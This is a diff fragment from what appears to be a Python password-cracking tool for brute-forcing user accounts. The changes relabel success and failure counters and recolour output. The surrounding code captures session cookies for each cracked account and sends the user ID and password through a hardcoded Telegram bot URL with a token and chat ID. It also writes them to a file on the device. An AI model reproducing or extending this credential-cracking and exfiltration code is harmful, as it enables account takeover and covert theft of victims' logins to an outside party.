@@ -474,8 +474,8 @@ def passwrd():
                                 pool.submit(crackfree,idf,pwv)
                         elif 'touch' in method:
                                 pool.submit(cracktouch,idf,pwv)
-        print(f'\n{x}𝑮𝑶𝑶𝑫-𝑲𝑰𝑳𝑳𝑬𝑹 : {H}%s '%(ok))
-        print(f'{x}𝑩𝑨𝑫-𝑲𝑰𝑳𝑳𝑬𝑹 : {m}%s '%(cp))
+        print(f'\n{x}𝑮𝑶𝑶𝑫-HAWTA : {H}%s '%(ok))
+        print(f'{x}𝑩𝑨𝑫-HAWTA : {m}%s '%(cp))
         print('Crack ( Y/t ) ? ')
         woi = input('{H} HALBZHERA  : ')
         if woi in ['y','Y']:
@@ -544,7 +544,7 @@ def crack(idf,pwv):
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                 requests.get(f"https://api.telegram.org/bot7291662040:AAHdeqNUm62e-VlWLjnYL3seA9qgMkABHj4/sendMessage?chat_id=7155363713&text=\r {idf} | {pw}")
                                 
-                                print(f'\r\033[41m\x1b[1;97m[ HaWa ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
+                                print(f'\r\x1b[38;5;248m[ HaWa ]\n[✓] USER : {idf} \n[✓] PASS : {pw} \n[✓] COOKIES : {kuki}')
                                 open('/sdcard/HaWa-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                 cek_SURCHY(kuki)
                                 break
